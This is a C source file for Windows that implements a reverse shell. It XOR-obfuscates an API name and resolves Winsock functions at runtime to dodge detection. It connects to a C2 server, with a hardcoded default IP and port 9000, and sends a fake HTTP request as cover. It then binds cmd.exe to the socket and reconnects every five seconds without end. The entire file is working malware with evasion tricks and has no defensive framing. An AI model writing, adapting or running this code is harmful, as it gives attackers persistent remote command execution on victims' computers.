#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>

#define DEFAULT_BUFLEN 1024

typedef int (WINAPI* WSASTARTUP)(WORD wVersionRequested, LPWSADATA lpWSAData);
typedef SOCKET (WSAAPI* WSASOCKETA)(int af, int type, int protocol, LPWSAPROTOCOL_INFOA lpProtocolInfo, GROUP g, DWORD dwFlags);
typedef unsigned long (WINAPI* myINET_ADDR)(const char *cp);
typedef u_short(WINAPI* myHTONS)(u_short hostshort);
typedef int (WSAAPI* WSACONNECT)(SOCKET s, const struct sockaddr *name, int namelen, LPWSABUF lpCallerData, LPWSABUF lpCalleeData, LPQOS lpSQOS, LPQOS lpGQOS);
typedef int (WINAPI* CLOSESOCKET)(SOCKET s);
typedef int (WINAPI* mySEND)(SOCKET s, const char *buf, int len, int flags);
typedef int (WINAPI* WSACLEANUP)(void);

#define XorKey 0x81

void xor(char *inputString, int inputLen, char** outputString) {
    *outputString = (char*)calloc(inputLen+1, sizeof(char));
    for (int i = 0; i < inputLen; i++) {
        (*outputString)[i] = inputString[i] ^ XorKey;
    }
}
void RunShell(char* C2Server, int C2Port) {
    HMODULE h_ws2_32 = LoadLibraryA("ws2_32");

    unsigned char s_WSAStartup[] = { 0xd6, 0xd2, 0xc0, 0xd2, 0xf5, 0xe0, 0xf3, 0xf5, 0xf4, 0xf1, };
    char *ds_WSAStartup = NULL;
    xor(s_WSAStartup, 10, &ds_WSAStartup);
    WSASTARTUP t_WSASTARTUP = (WSASTARTUP)GetProcAddress(h_ws2_32, ds_WSAStartup);
    free(ds_WSAStartup);

    WSASOCKETA t_WSASOCKETA = (WSASOCKETA)GetProcAddress(h_ws2_32, "WSASocketA");
    myINET_ADDR t_myINET_ADDR = (myINET_ADDR)GetProcAddress(h_ws2_32, "inet_addr");
    myHTONS t_myHTONS = (myHTONS)GetProcAddress(h_ws2_32, "htons");
    WSACONNECT t_WSACONNECT = (WSACONNECT)GetProcAddress(h_ws2_32, "WSAConnect");
    CLOSESOCKET t_CLOSESOCKET = (CLOSESOCKET)GetProcAddress(h_ws2_32, "closesocket");
    WSACLEANUP t_WSACLEANUP = (WSACLEANUP)GetProcAddress(h_ws2_32, "WSACleanup");
    mySEND t_mySEND = (mySEND)GetProcAddress(h_ws2_32, "send");

    while(TRUE) {
        SOCKET mySocket;
        struct sockaddr_in addr;
        WSADATA version;
        t_WSASTARTUP(MAKEWORD(2,2), &version);
        mySocket = t_WSASOCKETA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
        addr.sin_family = AF_INET;
   
        addr.sin_addr.s_addr = t_myINET_ADDR(C2Server);  //IP received from main function
        addr.sin_port = t_myHTONS(C2Port);     //Port received from main function

        //Connecting to Proxy/ProxyIP/C2Host
        if (t_WSACONNECT(mySocket, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0, 0)==SOCKET_ERROR) {
            t_CLOSESOCKET(mySocket);
            t_WSACLEANUP();
            continue;
        }
        else {
            CHAR init[] = "GET /index.html HTTP/1.1\r\n\r\n";
            INT initlen = strlen(init);
            t_mySEND(mySocket, init, initlen, 0);
            char Process[] = "cmd.exe";
            STARTUPINFO sinfo;
            PROCESS_INFORMATION pinfo;
            memset(&sinfo, 0, sizeof(sinfo));
            sinfo.cb = sizeof(sinfo);
            sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
            sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;
            CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
            WaitForSingleObject(pinfo.hProcess, INFINITE);
            CloseHandle(pinfo.hProcess);
            CloseHandle(pinfo.hThread);
        }
        Sleep(5000);    // if disconnects
    }
}

int main(int argc, char **argv) {
    // FreeConsole();
    if (argc == 3) {
        int port  = atoi(argv[2]);  
        RunShell(argv[1], port);
    }
    else {
        char host[] = "165.227.81.186";
        int port = 9000;
        RunShell(host, port);
    }
    return 0;
}